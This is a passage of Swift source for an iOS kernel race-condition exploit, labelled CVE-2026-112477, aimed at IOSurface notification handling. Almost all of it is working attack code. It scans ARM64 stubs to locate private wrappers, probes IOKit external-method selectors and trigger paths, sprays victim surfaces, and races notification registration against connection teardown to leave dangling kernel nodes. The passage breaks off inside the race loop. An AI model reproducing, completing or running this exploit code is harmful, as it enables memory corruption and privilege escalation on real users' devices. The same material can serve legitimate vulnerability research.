        let imm12 = UInt64((add >> 10) & 0xFFF)
        return page &+ imm12
    }
    func isADRP(_ w: UInt32) -> Bool { (w & 0x9F00001F) == 0x90000010 }
    func isADDimm(_ w: UInt32) -> Bool { (w & 0xFF80001F) == 0x91000010 }
    func isBRx16(_ w: UInt32) -> Bool { w == 0xD61F0200 }
    func isBRK1(_ w: UInt32) -> Bool { w == 0xD4200020 }
    func isPACIBSP(_ w: UInt32) -> Bool { w == 0xD503237F }

    struct WrapperCandidate { let stub: UInt64; let real: UInt64; let words: [UInt32] }

    func findWrapperCalls(_ fnAddr: UInt64, _ span: Int) -> [WrapperCandidate] {
        var found: [WrapperCandidate] = []
        for off in stride(from: 0, to: span, by: 4) {
            guard let w = read32(fnAddr &+ UInt64(off)) else { continue }
            guard (w & 0xFC000000) == 0x94000000 else { continue }
            let stub = blTarget(w, fnAddr &+ UInt64(off))
            guard let w0 = read32(stub), let w1 = read32(stub &+ 4),
                  let w2 = read32(stub &+ 8), let w3 = read32(stub &+ 12) else { continue }
            guard isADRP(w0), isADDimm(w1), isBRx16(w2), isBRK1(w3) else { continue }
            let real = stubTarget(w0, w1, stub)
            guard let r0 = read32(real), isPACIBSP(r0) else { continue }
            var ws: [UInt32] = []
            for i in 0..<8 {
                if let x = read32(real &+ UInt64(i * 4)) { ws.append(x) } else { break }
            }
            found.append(WrapperCandidate(stub: stub, real: real, words: ws))
        }
        return found
    }
    func matchesPrologue(_ c: WrapperCandidate, _ expected: [UInt32]) -> Bool {
        guard c.words.count >= expected.count else { return false }
        for i in 0..<expected.count { if c.words[i] != expected[i] { return false } }
        return true
    }
    func dumpCandidates(_ label: String, _ cands: [WrapperCandidate]) {
        emit("  [\(label)] \(cands.count) stub candidate(s)")
        for (i, c) in cands.enumerated() {
            var ws = ""
            for w in c.words { ws += String(format: "%08X ", w) }
            emit("   #\(i) stub=0x\(String(c.stub, radix: 16)) real=0x\(String(c.real, radix: 16))")
            emit("       real words = \(ws)")
        }
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emit("=== AGXProbe v121 - stub (use --race) ===")
        status = "Complete"; isRunning = false
    }

    // ---- raise the receive queue so a dispatch burst is not dropped ---------
    func setQLimit(_ p: mach_port_t, _ n: Int) {
        var limits = mach_port_limits_t(mpl_qlimit: mach_msg_type_number_t(n))
        _ = withUnsafeMutablePointer(to: &limits) { lp -> kern_return_t in
            lp.withMemoryRebound(to: integer_t.self, capacity: 2) { ip in
                mach_port_set_attributes(mach_task_self(), p, MACH_PORT_LIMITS_INFO,
                                         ip, mach_msg_type_number_t(MemoryLayout<mach_port_limits_t>.size / MemoryLayout<integer_t>.size))
            }
        }
    }

    // ---- non-blocking receive ------------------------------------------------
    func recvCount(_ p: mach_port_t, limit: Int = 4096) -> Int {
        var n = 0
        var buf = [UInt32](repeating: 0, count: 256)
        while n < limit {
            let kr: kern_return_t = buf.withUnsafeMutableBytes { raw -> kern_return_t in
                let h = raw.baseAddress!.assumingMemoryBound(to: mach_msg_header_t.self)
                h.pointee.msgh_bits = 0
                h.pointee.msgh_size = mach_msg_size_t(raw.count)
                h.pointee.msgh_local_port = p
                h.pointee.msgh_remote_port = 0
                return mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
                                mach_msg_size_t(raw.count), p, 0, 0)
            }
            if kr != KERN_SUCCESS { break }
            n += 1
        }
        return n
    }

    // ---- v100 race -----------------------------------------------------------
    func runRaceMode() async {
        isRunning = true; status = "Racing..."; log = ""
        quietUI = true
        raceBuf = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        emitRace("=== AGXProbe v121 - CVE-2026-112477 race ===")
        emitRace("iOS " + ProcessInfo.processInfo.operatingSystemVersionString)
        try? await Task.sleep(nanoseconds: 1_000_000_000)

        var iters = 300
        var reqPool = 512
        var victimPool = 256
        var drainPerIter = 1
        var nThreads = 4
        var closeDelayUS = 0
        for a in ProcessInfo.processInfo.arguments {
            if a.hasPrefix("--iters="), let v = Int(a.dropFirst(8)) { iters = v }
            if a.hasPrefix("--reqpool="), let v = Int(a.dropFirst(10)) { reqPool = v }
            if a.hasPrefix("--victims="), let v = Int(a.dropFirst(10)) { victimPool = v }
            if a.hasPrefix("--drains="), let v = Int(a.dropFirst(9)) { drainPerIter = v }
            if a.hasPrefix("--threads="), let v = Int(a.dropFirst(10)) { nThreads = v }
            if a.hasPrefix("--delay="), let v = Int(a.dropFirst(8)) { closeDelayUS = v }
        }
        emitRace("iters=\(iters) reqpool=\(reqPool) victims=\(victimPool) drains/iter=\(drainPerIter) threads=\(nThreads) delay=\(closeDelayUS)us")

        guard let fwH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW),
              let setSym = dlsym(fwH, "IOSurfaceClientSetSurfaceNotify"),
              let remSym = dlsym(fwH, "IOSurfaceClientRemoveSurfaceNotify"),
              let createSym = dlsym(fwH, "IOSurfaceCreate"),
              let getIdSym = dlsym(fwH, "IOSurfaceGetID") else {
            emitRace("[-] dlsym fail"); status = "Complete"; isRunning = false; return
        }
        let gCreate = unsafeBitCast(createSym, to: CreateFn.self)
        let gGetID = unsafeBitCast(getIdSym, to: GetIDFn.self)
        let gSet = unsafeBitCast(setSym, to: SetNotifyFn.self)
        let gRemove = unsafeBitCast(remSym, to: RemoveNotifyFn.self)

        guard let iokitH = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_NOW),
              let cmSym = dlsym(iokitH, "IOConnectCallMethod") else {
            emitRace("[-] IOConnectCallMethod dlsym fail"); status = "Complete"; isRunning = false; return
        }
        let gCallMethod = unsafeBitCast(cmSym, to: MethodFn.self)

        func krName(_ kr: Int32) -> String {
            switch kr {
            case KERN_SUCCESS: return "OK"
            case Int32(bitPattern: 0xe00002bd): return "NoMemory"
            case Int32(bitPattern: 0xe00002c1): return "BadMatching"
            case Int32(bitPattern: 0xe00002c2): return "BadArgument"
            case Int32(bitPattern: 0xe00002c9): return "Duplicate"
            case Int32(bitPattern: 0xe00002d8): return "NotAttached"
            default: return String(format: "0x%08x", UInt32(bitPattern: kr))
            }
        }
        func makeSurface(w: Int, h: Int) -> UnsafeMutableRawPointer? {
            var keyCB = kCFTypeDictionaryKeyCallBacks
            var valCB = kCFTypeDictionaryValueCallBacks
            let props = CFDictionaryCreateMutable(nil, 0, &keyCB, &valCB) as! NSMutableDictionary
            props["IOSurfaceWidth"] = w
            props["IOSurfaceHeight"] = h
            props["IOSurfaceBytesPerElement"] = 4
            // a pixel format is required for IOSurfaceLock to succeed
            let fmt = CFDataCreate(kCFAllocatorDefault, [UInt8(0x42), 0x47, 0x52, 0x41], 4)!
            props["IOSurfacePixelFormat"] = fmt
            return gCreate(props)
        }

        // ---- 1. resolve the two IOKit entry points ---------------------------
        emitRace("\n=== 1. runtime wrapper discovery ===")
        var infoIOS = Dl_info()
        var infoIOR = Dl_info()
        _ = dladdr(setSym, &infoIOS)
        _ = dladdr(remSym, &infoIOR)
        guard infoIOS.dli_saddr != nil, infoIOR.dli_saddr != nil else {
            emitRace("[-] dladdr failed"); status = "Complete"; isRunning = false; return
        }
        let setFn = unsafeBitCast(infoIOS.dli_saddr!, to: UInt64.self)
        let remFn = unsafeBitCast(infoIOR.dli_saddr!, to: UInt64.self)
        let setPrologue: [UInt32] = [0xD503237F, 0xD10203FF, 0xA9064FF4, 0xA9077BFD,
                                     0x9101C3FD, 0xAA0703E9, 0xAA0203EA, 0xAA0103E8]
        let remPrologue: [UInt32] = [0xD503237F, 0xD101C3FF, 0xA9054FF4, 0xA9067BFD,
                                     0x910183FD, 0xAA0703E9, 0xAA0603E8, 0xAA0503EA]
        let setCands = findWrapperCalls(setFn, 0x120)
        let remCands = findWrapperCalls(remFn, 0x120)
        dumpCandidates("set", setCands)
        dumpCandidates("remove", remCands)
        var setHits = setCands.filter { matchesPrologue($0, setPrologue) }
        var remHits = remCands.filter { matchesPrologue($0, remPrologue) }
        if setHits.isEmpty { setHits = setCands.filter { $0.words.count >= 2 && $0.words[0] == 0xD503237F && $0.words[1] == 0xD10203FF } }
        if remHits.isEmpty { remHits = remCands.filter { $0.words.count >= 2 && $0.words[0] == 0xD503237F && $0.words[1] == 0xD101C3FF } }
        guard setHits.count >= 1, remHits.count >= 1 else {
            emitRace("[-] wrapper discovery failed"); status = "Complete"; isRunning = false; return
        }
        let setWrap = unsafeBitCast(setHits[0].stub, to: SetWrapFn.self)
        let remWrap = unsafeBitCast(remHits[0].stub, to: RemWrapFn.self)
        emitRace("set   stub=0x\(String(setHits[0].stub, radix: 16)) real=0x\(String(setHits[0].real, radix: 16))")
        emitRace("rem   stub=0x\(String(remHits[0].stub, radix: 16)) real=0x\(String(remHits[0].real, radix: 16))")

        // ---- 2. open connections ---------------------------------------------
        emitRace("\n=== 2. open connections ===")
        var iter: io_iterator_t = 0
        var kr: Int32 = "IOSurfaceRoot".withCString {
            xq_IOServiceGetMatchingServices(0, xq_IOServiceMatching($0), &iter)
        }
        guard kr == KERN_SUCCESS else { emitRace("[-] matching failed"); status = "Complete"; isRunning = false; return }
        let svc = xq_IOIteratorNext(iter)
        emitRace("service = 0x\(String(svc, radix: 16))")
        func openConn() -> io_connect_t {
            var c: io_connect_t = 0
            _ = xq_IOServiceOpen(svc, mach_task_self(), 0, &c)
            return c
        }
        let connB = openConn()
        emitRace("drain conn = 0x\(String(connB, radix: 16))")
        guard connB != 0 else { emitRace("[-] open failed"); status = "Complete"; isRunning = false; return }

        var port: mach_port_t = 0
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port)
        setQLimit(port, 1024)
        emitRace("victim port 0x\(String(port, radix: 16)) kr=\(krN(kr))")
        guard kr == KERN_SUCCESS else { status = "Complete"; isRunning = false; return }
        var portD: mach_port_t = 0
        kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &portD)
        setQLimit(portD, 1024)
        emitRace("drain  port 0x\(String(portD, radix: 16)) kr=\(krN(kr))")

        // ---- 3. long root-global list on connB (bound to portD) --------------
        emitRace("\n=== 3. build root-global request list (\(reqPool)) ===")
        var reqSurfaces: [UnsafeMutableRawPointer] = []
        var reqIds: [UInt32] = []
        for i in 0..<reqPool {
            guard let s = makeSurface(w: 16, h: 16) else { break }
            let id = gGetID(s)
            var inSet: (UInt64, UInt64, UInt64) = (UInt64(portD), 1, UInt64(id))
            var outSet: (UInt64, UInt64, UInt64) = (1, UInt64(id), 0)
            let r: Int32 = withUnsafePointer(to: &inSet) { ip in
                withUnsafePointer(to: &outSet) { op in
                    setWrap(connB, 0x11, UInt64(portD), UnsafeRawPointer(ip), 3, 0, 0,
                            UnsafeRawPointer(op), 0x18, 0, 0, 0, 0)
                }
            }
            if r == 0 {
                reqSurfaces.append(s); reqIds.append(id)
                if i < 3 { emitRace("  set[\(i)] id=0x\(String(id, radix: 16)) OK out=(\(outSet.0),\(outSet.1),\(outSet.2))") }
            }
            else {
                /* leak: releasing IOSurface refs double-frees them */
                if i < 3 { emitRace("  set[\(i)] id=0x\(String(id, radix: 16)) -> \(krN(r))") }
            }
        }
        emitRace("registered \(reqIds.count)/\(reqPool) requests on connB")

        // ---- 4. victim surface pool ------------------------------------------
        var vs: [UnsafeMutableRawPointer] = []
        var vi: [UInt32] = []
        for _ in 0..<victimPool {
            guard let s = makeSurface(w: 16, h: 16) else { break }
            vs.append(s); vi.append(gGetID(s))
        }
        let victimSurfaces = vs
        let victimIds = vi
        emitRace("victim surface pool = \(victimIds.count)")

        // ---- 5. control + trigger discovery ----------------------------------
        // ---- 5b. external-method shape discovery -----------------------------
        // The raw 0x11 wrapper works but cannot create a notify-table entry
        // (lookup() needs a 1-based index into client+0x108).  Only selector
        // 0x24 (set_notify proper) fills that table and returns the index.
        // Probe the call shape on a dedicated connection.
        emitRace("\n=== 5b. external method shape discovery ===")
        let connC = openConn()
        emitRace("probe conn = 0x\(String(connC, radix: 16))")

        // 0x11 through plain IOConnectCallMethod: struct in {port,type,id},
        // struct out {type,id,0} (the kernel reads the key from the out slot)
        if let s = makeSurface(w: 16, h: 16) {
            let id = gGetID(s)
            var inS: (UInt64, UInt64, UInt64) = (UInt64(portD), 1, UInt64(id))
            var outS: (UInt64, UInt64, UInt64) = (1, UInt64(id), 0)
            var outSize = UInt64(0x18)
            let rc: Int32 = withUnsafePointer(to: &inS) { ip in
                withUnsafeMutablePointer(to: &outS) { op in
                    gCallMethod(connC, 0x11, nil, 0, UnsafeRawPointer(ip), 0x18,
                                nil, nil, UnsafeMutableRawPointer(op), &outSize)
                }
            }
            emitRace("0x11 IOConnectCallMethod(struct in {port,type,id}) rc=\(krName(rc)) out=(\(outS.0),\(outS.1),\(outS.2))")
            // same call again -> Duplicate proves the key was read as expected
            var inS2: (UInt64, UInt64, UInt64) = (UInt64(portD), 1, UInt64(id))
            var outS2: (UInt64, UInt64, UInt64) = (1, UInt64(id), 0)
            var outSize2 = UInt64(0x18)
            let rc2: Int32 = withUnsafePointer(to: &inS2) { ip in
                withUnsafeMutablePointer(to: &outS2) { op in
                    gCallMethod(connC, 0x11, nil, 0, UnsafeRawPointer(ip), 0x18,
                                nil, nil, UnsafeMutableRawPointer(op), &outSize2)
                }
            }
            emitRace("0x11 repeat (expect Duplicate) rc=\(krName(rc2))")
            /* leak: releasing IOSurface refs double-frees them */
        }

        // 0x24 shape candidates: 1 scalar in (the surface id), 2 scalars out
        var goodSlot: Int = 0
        var shapeOK = false
        var workingProbeIdx = -1
        if let s = makeSurface(w: 16, h: 16) {
            let id = gGetID(s)
            var sc: [UInt64] = [UInt64(id)]
            var oc: [UInt64] = [0, 0]
            var outCnt: UInt32 = 2
            let rcA: Int32 = sc.withUnsafeMutableBufferPointer { ib in
                oc.withUnsafeMutableBufferPointer { ob in
                    gCallMethod(connC, 0x24, UnsafePointer(ib.baseAddress), 1, nil, 0,
                                ob.baseAddress, &outCnt, nil, nil)
                }
            }
            emitRace("0x24 A (1 scalar in, 2 scalar out) rc=\(krName(rcA)) out=(\(oc[0]),\(oc[1])) cnt=\(outCnt)")

            var sc2: [UInt64] = [UInt64(id)]
            var structIn: (UInt64, UInt64) = (UInt64(id), 0)
            var oc2: [UInt64] = [0, 0]
            var outCnt2: UInt32 = 2
            let rcB: Int32 = sc2.withUnsafeMutableBufferPointer { ib in
                withUnsafePointer(to: &structIn) { sp in
                    oc2.withUnsafeMutableBufferPointer { ob in
                        gCallMethod(connC, 0x24, UnsafePointer(ib.baseAddress), 1,
                                    UnsafeRawPointer(sp), 0x10,
                                    ob.baseAddress, &outCnt2, nil, nil)
                    }
                }
            }
            emitRace("0x24 B (1 scalar + 16B struct in, 2 scalar out) rc=\(krName(rcB)) out=(\(oc2[0]),\(oc2[1]))")

            var oc3: [UInt64] = [0, 0]
            var outCnt3: UInt32 = 2
            let rcC: Int32 = oc3.withUnsafeMutableBufferPointer { ob in
                gCallMethod(connC, 0x24, nil, 0, nil, 0, ob.baseAddress, &outCnt3, nil, nil)
            }
            emitRace("0x24 C (no input) rc=\(krName(rcC)) out=(\(oc3[0]),\(oc3[1]))")

            // the 0x24 scalar is an index that the kernel bounds-checks with
            // "cmp x21, #3" -> try 0..3
            for probe in 0...3 {
                var scp: [UInt64] = [UInt64(probe)]
                var ocp: [UInt64] = [0, 0]
                var ocnt: UInt32 = 2
                let rcp: Int32 = scp.withUnsafeMutableBufferPointer { ib in
                    ocp.withUnsafeMutableBufferPointer { ob in
                        gCallMethod(connC, 0x24, UnsafePointer(ib.baseAddress), 1, nil, 0,
                                    ob.baseAddress, &ocnt, nil, nil)
                    }
                }
                emitRace("0x24 probe index=\(probe) rc=\(krName(rcp)) out=(\(ocp[0]),\(ocp[1]))")
                if rcp == 0 && ocp[0] != 0 {
                    goodSlot = Int(ocp[0])
                    shapeOK = true
                    workingProbeIdx = probe
                    emitRace("0x24 WORKS with index \(probe): slot = \(goodSlot)")
                }
            }

            if rcA == 0 || rcB == 0 {
                shapeOK = true
                goodSlot = Int(oc[0] != 0 ? oc[0] : oc2[0])
                emitRace("0x24 WORKS: slot = \(goodSlot)")
            }
            /* leak: releasing IOSurface refs double-frees them */
        }
        emitRace("0x24 shape found: \(shapeOK) slot=\(goodSlot) probeIdx=\(workingProbeIdx)")


        // if 0x24 worked, try the 0xf trigger on that slot
        if shapeOK && goodSlot > 0 {
            var sc: [UInt64] = [UInt64(goodSlot), 1]
            var oc: [UInt64] = [0, 0]
            var outCnt: UInt32 = 2
            let rc: Int32 = sc.withUnsafeMutableBufferPointer { ib in
                oc.withUnsafeMutableBufferPointer { ob in
                    gCallMethod(connC, 0xf, UnsafePointer(ib.baseAddress), 2, nil, 0,
                                nil, nil, nil, nil)
                }
            }
            let n = recvCount(portD)
            emitRace("0xf(slot=\(goodSlot), flag=1) rc=\(krName(rc)) control msgs = \(n)")
            var sc2: [UInt64] = [UInt64(goodSlot), 0]
            let rc2: Int32 = sc2.withUnsafeMutableBufferPointer { ib in
                gCallMethod(connC, 0xf, UnsafePointer(ib.baseAddress), 2, nil, 0, nil, nil, nil, nil)
            }
            let n2 = recvCount(portD)
            emitRace("0xf(slot=\(goodSlot), flag=0) rc=\(krName(rc2)) control msgs = \(n2)")
        }

        emitRace("\n=== 5. control and trigger discovery ===")
        var triggerOK = 0
        var triggerFail = 0
        var triggerMode = 0            // 0 = unknown, 1 = bare release, 2 = gRemove
        var triggerHits = 0

        // control notification through the framework's own client
        var ctlSurf: UnsafeMutableRawPointer? = nil
        var ctlId: UInt32 = 0
        if let s = makeSurface(w: 16, h: 16) {
            ctlSurf = s
            ctlId = gGetID(s)
            let rc = gSet(portD, 1, UInt64(ctlId))
            emitRace("control gSet(portD, type=1, id=0x\(String(ctlId, radix: 16))) rc=\(krName(rc))")
        } else {
            emitRace("[-] could not create the control surface")
        }

        // candidate A: release a bare surface -> surface finalize -> drain
        var cA = 0
        for _ in 0..<4 {
            if let s = makeSurface(w: 16, h: 16) { /* leak: releasing IOSurface refs double-frees them */ }
            cA += recvCount(portD)
        }
        emitRace("trigger A (release bare surface x4): control msgs = \(cA)")
        if cA > 0 { triggerHits += 1; triggerMode = 1 }

        // candidate B: remove the control notification
        let rcB = gRemove(UInt64(ctlId))
        let cB = recvCount(portD)
        emitRace("trigger B (gRemove id=0x\(String(ctlId, radix: 16))) rc=\(krName(rcB)) control msgs = \(cB)")
        if cB > 0 && triggerHits == 0 { triggerHits += 1; triggerMode = 2 }
        // re-arm the control if B consumed it
        if triggerMode == 2 {
            if let s = makeSurface(w: 16, h: 16) {
                ctlSurf = s
                ctlId = gGetID(s)
                let rc = gSet(portD, 1, UInt64(ctlId))
                emitRace("control re-armed id=0x\(String(ctlId, radix: 16)) rc=\(krName(rc))")
            }
        }

        // candidate C: register + release + remove (forces the surface to die)
        var cC = 0
        if let s = makeSurface(w: 16, h: 16) {
            let id = gGetID(s)
            let rc1 = gSet(portD, 1, UInt64(id))
            /* leak: releasing IOSurface refs double-frees them */
            let rc2 = gRemove(UInt64(id))
            cC = recvCount(portD)
            emitRace("trigger C (set/release/remove id=0x\(String(id, radix: 16))) set=\(krName(rc1)) rem=\(krName(rc2)) control msgs = \(cC)")
            if cC > 0 && triggerHits == 0 { triggerHits += 1; triggerMode = 3 }
        }

        emitRace("trigger candidates that fired: \(triggerHits) (mode=\(triggerMode))")

        // ---- extra trigger candidates (v104) --------------------------------
        // IOSurface caches surfaces, so a plain release never finalizes them
        // and dispatchNotify never runs.  IOSurfaceSetShouldCache(false) must
        // destroy the surface the moment the last reference goes away, which
        // reaches the surface finalize (0xa33c694) -> drain -> dispatchNotify.
        typealias ShouldCacheFn = @convention(c) (UnsafeMutableRawPointer, Bool) -> Void
        typealias PurgeableFn = @convention(c) (UnsafeMutableRawPointer, Bool) -> Bool
        typealias LockFn = @convention(c) (UnsafeMutableRawPointer, UInt64, UnsafeMutableRawPointer?) -> Bool
        let shouldCacheSym = dlsym(fwH, "IOSurfaceSetShouldCache")
        let purgeableSym = dlsym(fwH, "IOSurfaceSetPurgeable")
        let lockSym = dlsym(fwH, "IOSurfaceLock")
        let unlockSym = dlsym(fwH, "IOSurfaceUnlock")
        emitRace("symbols: shouldCache=\(shouldCacheSym != nil) purgeable=\(purgeableSym != nil) lock=\(lockSym != nil) unlock=\(unlockSym != nil)")

        // candidate E: non-cacheable surface, released -> real finalize
        if let sym = shouldCacheSym {
            let f = unsafeBitCast(sym, to: ShouldCacheFn.self)
            var cE = 0
            for _ in 0..<3 {
                if let s = makeSurface(w: 16, h: 16) {
                    f(s, false)
                    /* leak: releasing IOSurface refs double-frees them */
                    cE += recvCount(portD)
                }
            }
            emitRace("trigger E (shouldCache=false + release x3): control msgs = \(cE)")
            if cE > 0 && triggerHits == 0 { triggerHits += 1; triggerMode = 5 }
        }

        // candidate F: purgeable surface
        if let sym = purgeableSym {
            let f = unsafeBitCast(sym, to: PurgeableFn.self)
            var cF = 0
            if let s = makeSurface(w: 16, h: 16) {
                _ = f(s, true)
                /* leak: releasing IOSurface refs double-frees them */
                cF = recvCount(portD)
            }
            emitRace("trigger F (setPurgeable + release): control msgs = \(cF)")
            if cF > 0 && triggerHits == 0 { triggerHits += 1; triggerMode = 6 }
        }

        // candidate G: lock / unlock the CONTROL surface (the kernel fires
        // notify on the unlock of a surface that carries a registration)
        if let ls = lockSym, let us = unlockSym {
            let lf = unsafeBitCast(ls, to: LockFn.self)
            let uf = unsafeBitCast(us, to: LockFn.self)
            var cG = 0
            if let cs = ctlSurf {
                var lo: UInt64 = 0
                let r1 = lf(cs, 0, &lo)
                let n1 = recvCount(portD)
                let r2 = uf(cs, 0, &lo)
                let n2 = recvCount(portD)
                cG += n1 + n2
                emitRace("trigger G (lock/unlock on the CONTROL surface): lock=\(r1) msgs=\(n1) unlock=\(r2) msgs=\(n2)")
            }
            // and a second round on a freshly registered surface
            if let s = makeSurface(w: 16, h: 16) {
                let id = gGetID(s)
                let rc = gSet(portD, 1, UInt64(id))
                var lo: UInt64 = 0
                _ = lf(s, 0, &lo)
                let n3 = recvCount(portD)
                _ = uf(s, 0, &lo)
                let n4 = recvCount(portD)
                cG += n3 + n4
                emitRace("trigger G2 (register + lock/unlock id=0x\(String(id, radix: 16)) gSet=\(krName(rc))): msgs=\(n3)/\(n4)")
                /* leak: releasing IOSurface refs double-frees them */
            }
            emitRace("trigger G total control msgs = \(cG)")
            if cG > 0 && triggerHits == 0 { triggerHits += 1; triggerMode = 7 }
        }

        // candidate H: close a connection (client teardown may drain)
        var cH = 0
        let c2 = openConn()
        if c2 != 0 {
            _ = xq_IOServiceClose(c2)
            cH = recvCount(portD)
        }
        emitRace("trigger H (open+close a connection): control msgs = \(cH)")
        if cH > 0 && triggerHits == 0 { triggerHits += 1; triggerMode = 8 }

        // candidate I: use-count increment / decrement.  IOSurface fires its
        // notify when the use count of a surface changes, so
        // IncrementUseCount + DecrementUseCount is the notification trigger.
        typealias UseCountFn = @convention(c) (UnsafeMutableRawPointer) -> Bool
        let incSym = dlsym(fwH, "IOSurfaceIncrementUseCount")
        let decSym = dlsym(fwH, "IOSurfaceDecrementUseCount")
        let inUseSym = dlsym(fwH, "IOSurfaceIsInUse")
        let getUC = dlsym(fwH, "IOSurfaceGetUseCount")
        emitRace("symbols: incUse=\(incSym != nil) decUse=\(decSym != nil) isInUse=\(inUseSym != nil) getUseCount=\(getUC != nil)")
        if let isym = incSym, let dsym = decSym {
            let inc = unsafeBitCast(isym, to: UseCountFn.self)
            let dec = unsafeBitCast(dsym, to: UseCountFn.self)
            var cI = 0
            // on the CONTROL surface (it carries the gSet registration)
            if let cs = ctlSurf {
                let r1 = inc(cs)
                let r2 = dec(cs)
                cI = recvCount(portD)
                emitRace("trigger I (inc/dec use count on the CONTROL surface): inc=\(r1) dec=\(r2) control msgs = \(cI)")
            }
            // and on a freshly registered surface
            if let s = makeSurface(w: 16, h: 16) {
                let id = gGetID(s)
                let rc = gSet(portD, 1, UInt64(id))
                let r1 = inc(s)
                let r2 = dec(s)
                let n = recvCount(portD)
                cI += n
                emitRace("trigger I2 (register + inc/dec id=0x\(String(id, radix: 16)) gSet=\(krName(rc))): inc=\(r1) dec=\(r2) msgs = \(n)")
                /* leak: releasing IOSurface refs double-frees them */
            }
            emitRace("trigger I total control msgs = \(cI)")
            if cI > 0 && triggerHits == 0 { triggerHits += 1; triggerMode = 9 }
        }

        emitRace("trigger candidates that fired (after v104 probes): \(triggerHits) (mode=\(triggerMode))")

        // the trigger used by the race loop
        func fireTrigger() -> Int {
            var n = 0
            if triggerMode == 1 || triggerMode == 0 {
                if let s = makeSurface(w: 16, h: 16) { /* leak: releasing IOSurface refs double-frees them */ }
                n += recvCount(portD)
            }
            if triggerMode == 2 {
                _ = gRemove(UInt64(ctlId))
                n += recvCount(portD)
            }
            if triggerMode == 3 {
                if let s = makeSurface(w: 16, h: 16) {
                    let id = gGetID(s)
                    _ = gSet(portD, 1, UInt64(id))
                    /* leak: releasing IOSurface refs double-frees them */
                    _ = gRemove(UInt64(id))
                    n += recvCount(portD)
                }
            }
            if triggerMode == 5, let sym = shouldCacheSym {
                let f = unsafeBitCast(sym, to: ShouldCacheFn.self)
                if let s = makeSurface(w: 16, h: 16) {
                    f(s, false)
                    /* leak: releasing IOSurface refs double-frees them */
                }
                n += recvCount(portD)
            }
            if triggerMode == 6, let sym = purgeableSym {
                let f = unsafeBitCast(sym, to: PurgeableFn.self)
                if let s = makeSurface(w: 16, h: 16) {
                    _ = f(s, true)
                    /* leak: releasing IOSurface refs double-frees them */
                }
                n += recvCount(portD)
            }
            if triggerMode == 7, let ls = lockSym, let us = unlockSym {
                let lf = unsafeBitCast(ls, to: LockFn.self)
                let uf = unsafeBitCast(us, to: LockFn.self)
                if let cs = ctlSurf {
                    var lo: UInt64 = 0
                    _ = lf(cs, 0, &lo)
                    _ = uf(cs, 0, &lo)
                }
                n += recvCount(portD)
            }
            if triggerMode == 8 {
                let c3 = openConn()
                if c3 != 0 { _ = xq_IOServiceClose(c3) }
                n += recvCount(portD)
            }
            if triggerMode == 9, let isym = incSym, let dsym = decSym {
                let inc = unsafeBitCast(isym, to: UseCountFn.self)
                let dec = unsafeBitCast(dsym, to: UseCountFn.self)
                if let cs = ctlSurf {
                    _ = inc(cs)
                    _ = dec(cs)
                }
                n += recvCount(portD)
            }
            return n
        }

        // ---- 5a. find a notify index that makes a node deliverable ----------
        // notifyOne() resolves the node's index (key[2]) through
        // lookup(client, index), which needs 1 <= index < count where count
        // lives at client+0x110.  Find the index empirically: register a node
        // on a live connection and see whether the dispatch delivers it.
        emitRace("\n=== 5a. notify-index discovery ===")
        var goodIdx: UInt64 = 0
        if shapeOK && workingProbeIdx >= 0 {
            // give connB a notify-table entry first
            var scp: [UInt64] = [UInt64(workingProbeIdx)]
            var ocp: [UInt64] = [0, 0]
            var ocnt: UInt32 = 2
            let rcp: Int32 = scp.withUnsafeMutableBufferPointer { ib in
                ocp.withUnsafeMutableBufferPointer { ob in
                    gCallMethod(connB, 0x24, UnsafePointer(ib.baseAddress), 1, nil, 0,
                                ob.baseAddress, &ocnt, nil, nil)
                }
            }
            emitRace("connB 0x24 rc=\(krName(rcp)) out=(\(ocp[0]),\(ocp[1]))")
            for cand in [UInt64(1), UInt64(2), UInt64(3), ocp[0]] {
                if cand == 0 { continue }
                // a fresh surface per candidate so the node is not a duplicate
                guard let s = makeSurface(w: 16, h: 16) else { continue }
                let id = gGetID(s)
                var inS: (UInt64, UInt64, UInt64) = (UInt64(port), 1, UInt64(id))
                var outS: (UInt64, UInt64, UInt64) = (1, UInt64(id), cand)
                let r: Int32 = withUnsafePointer(to: &inS) { ip in
                    withUnsafePointer(to: &outS) { op in
                        setWrap(connB, 0x11, UInt64(port), UnsafeRawPointer(ip), 3, 0, 0,
                                UnsafeRawPointer(op), 0x18, 0, 0, 0, 0)
                    }
                }
                let before = recvCount(port)
                _ = fireTrigger()
                let n = recvCount(port)
                emitRace("  index \(cand): register rc=\(krN(r)) victim msgs after trigger = \(n) (before \(before))")
                if n > 0 && goodIdx == 0 { goodIdx = cand }
                /* leak */
            }
        }
        emitRace("notify index that delivers: \(goodIdx)")

        // ---- 6. race loop ----------------------------------------------------
        emitRace("\n=== 6. race: set-only vs IOServiceClose ===")

        var totalOps = 0
        var totalOKSet = 0
        var totalErrSet = 0
        var totalCtl = 0
        var totalStale = 0
        var totalLate = 0
        var totalAfter = 0
        var staleIters: [Int] = []
        if iters > 0 {
        for i in 1...iters {
            let c = openConn()
            if c == 0 { continue }
            // a fresh context per iteration: a thread that is still winding
            // down from the previous iteration must not see this iteration's
            // connection (that used to pile threads up and crash SwiftUI)
            let ctx = RaceCtx()
            ctx.port = port
            ctx.ids = victimIds
            ctx.nthreads = nThreads
            ctx.setWrap = setWrap
            ctx.conn = c
            ctx.stop = 0
            ctx.done = 0
            ctx.ops = 0
            ctx.okSet = 0; ctx.errSet = 0
            ctx.victimIdx = 0

            // If selector 0x24 works, create a real notify-table entry on the
            // victim connection so the victim nodes carry a valid index: then
            // a node that survives the teardown will actually deliver a
            // notification to the victim port (the win signal), instead of
            // only being a dangling pointer.
            if shapeOK && workingProbeIdx >= 0 {
                var scp: [UInt64] = [UInt64(workingProbeIdx)]
                var ocp: [UInt64] = [0, 0]
                var ocnt: UInt32 = 2
                let rcp: Int32 = scp.withUnsafeMutableBufferPointer { ib in
                    ocp.withUnsafeMutableBufferPointer { ob in
                        gCallMethod(c, 0x24, UnsafePointer(ib.baseAddress), 1, nil, 0,
                                    ob.baseAddress, &ocnt, nil, nil)
                    }
                }
                ctx.victimIdx = goodIdx
